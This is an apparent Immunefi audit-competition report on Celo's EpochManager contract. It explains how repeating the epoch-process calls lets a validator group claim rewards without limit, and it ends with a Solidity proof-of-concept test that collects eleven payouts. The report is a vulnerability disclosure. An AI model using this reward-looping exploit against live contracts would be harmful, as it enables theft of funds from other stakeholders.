# #37058 \[SC-High] Theft of remuneration through claims processing loops.

**Submitted on Nov 24th 2024 at 05:14:27 UTC by @innertia for** [**Audit Comp | Celo**](https://immunefi.com/audit-competition/audit-comp-celo)

* **Report ID:** #37058
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/celo-org/celo-monorepo/blob/release/core-contracts/12/packages/protocol/contracts-0.8/common/EpochManager.sol>
* **Impacts:**
  * Theft of unclaimed royalties

## Description

## Brief/Intro

In `EpochManager`, rewards are distributed by advancing the `EpochProcess`. However, if a group that has already received a reward loops through the process, it will be able to obtain as many rewards as it likes.

## Vulnerability Details

In `setToProcessGroups`, rewards are assigned to the `group` corresponding to the `electedAccounts`.

```
        processedGroups[group] = epochRewards == 0 ? type(uint256).max : epochRewards;
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L247>

After that, rewards are distributed within the `processGroup`.

```
      election.distributeEpochRewards(group, epochRewards, lesser, greater);
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L288>

At this point, `processedGroups` are deleted, but `electedAccounts` are not deleted.

```
    delete processedGroups[group];
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L291>

In other words, by starting `setToProcessGroups` again, rewards are assigned to the same groups corresponding to the `electedAccounts` again.

```
    for (uint i = 0; i < electedAccounts.length; i++) {
      address group = validators.getValidatorsGroup(electedAccounts[i]);
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L236-L237>

By repeating this, `group` can obtain as many rewards as they like. In the case of `finishNextEpochProcess`, where the same process is executed in batches, the `electedAccounts` are deleted each time the process is executed. This is not a problem.

```
      delete electedAccounts[i];
      delete electedSigners[i];
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L336-L337>

This problem occurs because there is no such process in `setToProcessGroups`.

## Impact Details

A selected group of people can receive unlimited rewards.

## References

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L247.\\>
<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L288.\\>
<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L291.\\>
<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L236-L237.\\>
<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts-0.8/common/EpochManager.sol#L336-L337>.

## Proof of Concept

First, as a preliminary preparation, modify the `distributeEpochRewards` of `MockElection`. In this mock, the value is simply assigned, but in the original function behaviour, the correct behaviour is to add. Therefore, modify it as follows.

```
function distributeEpochRewards(address group, uint256 value, address, address) external {

//before
//distributedEpochRewards[group] = value;

//after
distributedEpochRewards[group] += value;

/**
* below is original function in Election.so
* function _distributeEpochRewards(address group, uint256 value, address lesser, address greater) internal {
* if (votes.total.eligible.contains(group)) {
* uint256 newVoteTotal = votes.total.eligible.getValue(group).add(value);
* votes.total.eligible.update(group, newVoteTotal, lesser, greater);
* }
*
* votes.active.forGroup[group].total = votes.active.forGroup[group].total.add(value);
* votes.active.total = votes.active.total.add(value);
* emit EpochRewardsDistributedToVoters(group, value);
* }
*/
}
```

<https://github.com/celo-org/celo-monorepo/blob/4903cfa3744f4e03c5c042c3f881cc93d4807b21/packages/protocol/contracts/governance/test/MockElection.sol#L104-L106>

With this modification, the existing test will not fail.

Now, we will begin the test of reward theft. As this is a repurposed version of an existing test, I have only written comments for the important parts. Please add the following contract to `EpochManager.t.sol`.\
<https://github.com/celo-org/celo-monorepo/blob/release/core-contracts/12/packages/protocol/test-sol/unit/common/EpochManager.t.sol>

```
contract EpochManagerTest_UnlimitedReward is EpochManagerTest {

address signer1 = actor("signer1");
address signer2 = actor("signer2");
address signer3 = actor("signer3");
address signer4 = actor("signer4");

address validator3 = actor("validator3");
address validator4 = actor("validator4");

address group2 = actor("group2");

address[] elected;

uint256 groupEpochRewards = 44e18;

function setUp() public override {

super.setUp();
firstElected.push(validator3);
firstElected.push(validator4);

validators.setValidatorGroup(group);
validators.setValidator(validator1);
accounts.setValidatorSigner(validator1, signer1);
validators.setValidator(validator2);
accounts.setValidatorSigner(validator2, signer2);

validators.setValidatorGroup(group2);
validators.setValidator(validator3);
validators.setValidator(validator4);

accounts.setValidatorSigner(validator3, signer3);
accounts.setValidatorSigner(validator4, signer4);

address[] memory members = new address[](2);
members[0] = validator1;
members[1] = validator2;
validators.setMembers(group, members);

members[0] = validator3;
members[1] = validator4;
validators.setMembers(group2, members);

address[] memory valids = new address[](4);
valids[0] = validator1;
valids[1] = validator2;
valids[2] = validator3;
valids[3] = validator4;

election.setElectedValidators(valids);

deployCodeTo("MockRegistry.sol", abi.encode(false), PROXY_ADMIN_ADDRESS);

vm.prank(epochManagerEnabler);
epochManager.initializeSystem(firstEpochNumber, firstEpochBlock, firstElected);
travelNL2Epoch(vm, 1);

elected = epochManager.getElectedAccounts();
election.setGroupEpochRewardsBasedOnScore(group, groupEpochRewards);

}

  

function test_UnlimitedReward() public {

//This is a normal process.
epochManager.startNextEpochProcess();
epochManager.setToProcessGroups();
epochManager.processGroup(group, address(0), address(0));

//The amount of remuneration is also fine.
assertEq(election.distributedEpochRewards(group), groupEpochRewards);

//The problem is that you can loop the process as many times as you like (in this test, we set it to 10 times).

uint256 n = 10;
for (uint256 i = 0; i < n; i++) {
epochManager.startNextEpochProcess();
epochManager.setToProcessGroups();
epochManager.processGroup(group, address(0), address(0));
}

//In addition to the first normal reward, you have received 11 rewards.

assertEq(election.distributedEpochRewards(group), groupEpochRewards * (n + 1));
}
}

```
